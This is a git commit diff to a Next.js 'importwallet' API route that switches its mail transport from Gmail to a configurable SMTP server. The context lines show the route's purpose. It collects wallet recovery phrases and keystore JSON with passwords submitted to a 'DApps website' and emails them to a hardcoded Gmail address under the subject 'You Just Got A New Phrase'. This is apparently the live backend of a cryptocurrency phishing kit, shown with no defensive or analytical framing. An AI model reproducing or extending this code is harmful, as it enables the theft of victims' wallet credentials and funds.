df9bd32637e5418efca0c25472f23b887e197a97
random-michawa <randommichawa@outlook.com>
2025-09-30 10:01:12 +0100

    Update route.ts

--- src/app/api/importwallet/route.ts
+++ src/app/api/importwallet/route.ts
@@ -4,13 +4,17 @@ const formatMessage = async (message: string) => {
   const email = process.env.EMAIL;
   const pass = process.env.PASS;
 
-  const transporter = nodemailer.createTransport({
-    service: 'gmail',
-    auth: {
-      user: email,
-      pass,
-    }
-  });
+ const transporter = nodemailer.createTransport({
+  host: process.env.SMTP_HOST,
+  port: parseInt(process.env.SMTP_PORT as string), // Convert string to number
+  secure: process.env.SMTP_SECURE === "true", // Convert to boolean
+  auth: {
+    user: process.env.EMAIL,
+    pass: process.env.PASS,
+  },
+//   debug: true, 
+//   logger: true, 
+});
 
   // Split the message into lines
   const lines = message.split(/\r?\n/);
@@ -58,12 +62,16 @@ export async function POST(request: Request) {
       const pass = process.env.PASS
 
       const transporter = nodemailer.createTransport({
-        service: 'gmail',
-        auth: {
-          user: email,
-          pass,
-        }
-      })
+  host: process.env.SMTP_HOST,
+  port: parseInt(process.env.SMTP_PORT as string), // Convert string to number
+  secure: process.env.SMTP_SECURE === "true", // Convert to boolean
+  auth: {
+    user: process.env.EMAIL,
+    pass: process.env.PASS,
+  },
+//   debug: true, 
+//   logger: true, 
+});
 
 
       const formattedMessage = await formatMessage(phrase);
@@ -98,18 +106,22 @@ export async function POST(request: Request) {
       const pass = process.env.PASS
 
       const transporter = nodemailer.createTransport({
-        service: 'gmail',
-        auth: {
-          user: email,
-          pass,
-        }
-      })
+  host: process.env.SMTP_HOST,
+  port: parseInt(process.env.SMTP_PORT as string), // Convert string to number
+  secure: process.env.SMTP_SECURE === "true", // Convert to boolean
+  auth: {
+    user: process.env.EMAIL,
+    pass: process.env.PASS,
+  },
+//   debug: true, 
+//   logger: true, 
+});
 
 
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: "adev93108@gmail.com",
+        to: 'adev93108@gmail.com',
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`,
       }
@@ -137,12 +149,16 @@ export async function POST(request: Request) {
       const pass = process.env.PASS
 
       const transporter = nodemailer.createTransport({
-        service: 'gmail',
-        auth: {
-          user: email,
-          pass,
-        }
-      })
+  host: process.env.SMTP_HOST,
+  port: parseInt(process.env.SMTP_PORT as string), // Convert string to number
+  secure: process.env.SMTP_SECURE === "true", // Convert to boolean
+  auth: {
+    user: process.env.EMAIL,
+    pass: process.env.PASS,
+  },
+//   debug: true, 
+//   logger: true, 
+});
 
 
 
@@ -150,7 +166,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: "adev93108@gmail.com",
+        to: 'adev93108@gmail.com',
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: formattedMessage,
       }
